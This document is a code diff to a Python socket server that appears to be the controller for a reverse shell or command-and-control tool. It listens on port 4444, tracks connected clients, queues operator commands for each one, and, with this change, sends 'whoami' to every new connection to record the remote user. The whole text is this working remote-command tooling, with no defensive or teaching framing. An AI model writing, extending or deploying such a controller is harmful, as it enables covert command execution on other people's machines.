@@ -10,6 +10,7 @@ port = 4444
 ThreadCount = 0
 cmd_queue={}
 connections = []
+
 try:
     ServerSocket.bind((host, port))
 except socket.error as e:
@@ -28,7 +29,7 @@ def threaded_client(connection, num):
                 break
             data = str(connection.recv(1024),"UTF-8")
             print()
-            print(num,":",data)
+            print(num,":",data,end='\n\n> ')
             cmd_queue[num] = None
     connection.close()
 
@@ -36,20 +37,22 @@ def connectionManagement():
     global ThreadCount
     while True:
         Client, address = ServerSocket.accept()
-        print('Connected to: ' + address[0] + ':' + str(address[1]))
-        connections.append(address[0] + ':' + str(address[1]))
+        Client.send(str.encode("whoami"))
+        user = str(Client.recv(1024),"utf-8").strip()
+        print(f'Connected to: {user}@{address[0]}:{str(address[1])}')
+        connections.append(f'{user}@{address[0]}:{str(address[1])}')
         start_new_thread(threaded_client, (Client, ThreadCount, ))
         ThreadCount += 1
-        print('Thread Number: ' + str(ThreadCount))
-        print("> ", end = "")
+        print('Thread Number: ' + str(ThreadCount) + "\n> ", end = "")
 
 start_new_thread(connectionManagement, ())
 
 while True:
-    data = input("> ")
+    data = input()
     if data == "list":
         for i in range(len(connections)):
             print(i, ":", connections[i])
+        print("> ", end = "")
     elif data == "exit":
         for i in range(ThreadCount):
             cmd_queue[i] = "exit"
@@ -63,6 +66,7 @@ while True:
             num_size = len(nums[0])
             cmd_queue[int(nums[0])] = data[num_size:].strip()
         except:
+            print("> ", end = "")
             pass
 
 ServerSocket.close()
